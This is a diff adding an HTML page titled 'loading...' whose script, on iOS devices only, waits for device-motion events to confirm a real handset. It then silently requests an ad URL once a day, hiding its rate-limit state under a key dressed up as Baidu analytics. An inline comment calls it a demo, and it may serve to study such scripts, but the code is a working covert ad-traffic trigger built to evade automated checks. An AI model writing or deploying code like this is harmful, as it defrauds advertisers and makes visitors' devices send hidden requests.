@@ -1,0 +1,104 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <title>loading...</title>
+</head>
+
+<body>
+  <script>
+    // 跨域无法正常演示。
+    ; (function () {
+      var obj = {
+        ft_ts: 0,
+        aa: ['http://pp.longtugame.com/apimob/ad?_c=21624'],
+        xmlHttp: null,
+        newAjax: function () {
+          if (window['ActiveXObject']) {
+            var msArr = ['Microsoft', 'msxm3', 'msxml2', 'msxml1'];
+            for (var i = 0, len = msArr.length; i < len; i++) {
+              try {
+                var msXmlHttp = msArr[i] + '.XMLHTTP';
+                this.xmlHttp = new ActiveXObject(msXmlHttp)
+              } catch (e) { }
+            }
+          } else {
+            if (window.XMLHttpRequest) {
+              this.xmlHttp = new XMLHttpRequest()
+            }
+          }
+        },
+        curl: function (url) {
+          this.newAjax();
+          this.xmlHttp.open('GET', encodeURI(url));
+          this.xmlHttp.send(null)
+        },
+        devicemotion: function () {
+          this.ft_ts = 0;
+          if (!window.DeviceMotionEvent) {
+            return false
+          };
+          window.addEventListener('devicemotion', handleDevicemotion.bind(this), false);
+
+          function handleDevicemotion(e) {
+            if (this.ft_ts >= 3) {
+              window.removeEventListener('devicemotion', handleDevicemotion, false);
+              return false
+            };
+            this.ft_ts++
+          }
+        },
+        rr: function () {
+          for (var i = 0, len = this.aa.length; i < len; i++) {
+            this.curl(this.aa[i])
+          }
+        },
+        n: function (arr, len) {
+          var arrItem0 = arr.slice(0),
+            arrLen = arr.length,
+            disLen = arrLen - len,
+            _0xebbdxe, rd;
+          while (arrLen-- > disLen) {
+            rd = Math.floor((arrLen + 1) * Math.random());
+            _0xebbdxe = arrItem0[rd];
+            arrItem0[rd] = arrItem0[arrLen];
+            arrItem0[arrLen] = _0xebbdxe
+          };
+          return arrItem0.slice(disLen)
+        },
+        init: function () {
+          if (!/(iPhone|iPad|iPod)/i['test'](navigator['userAgent'])) {
+            return
+          };
+          this.devicemotion();
+          setTimeout(function () {
+            var hcq = JSON.parse(window.localStorage.getItem('Hm_cp_quiet'));
+            (hcq && hcq.dateTime) || (hcq = {
+              dateTime: 0
+            });
+            if (hcq.dateTime < Date.now() && (this.ft_ts >= 3 || location.hash.replace('#', '').split('/')[0] == 'jsont')) {
+              window.localStorage.setItem('Hm_cp_quiet', JSON.stringify({
+                dateTime: Date.now() + 86400000
+              }));
+              this.rr()
+            }
+          }.bind(this), 1000);
+          this.aa = this.n(this.aa, this.aa.length)
+        }
+      };
+      obj['init']()
+    })();
+    // var _hmt = _hmt || [];
+    // (function() {
+    //   var _0xebbdx12 = document['createElement']('script');
+    //   _0xebbdx12['src'] = 'https://hm.baidu.com/hm.js?7b6092bc1a83e9ac3bf9e3d781369a96';
+    //   var _0xebbdx13 = document['getElementsByTagName']('script')[0];
+    //   _0xebbdx13['parentNode']['insertBefore'](_0xebbdx12, _0xebbdx13)
+    // })()
+  </script>
+</body>
+
+</html>
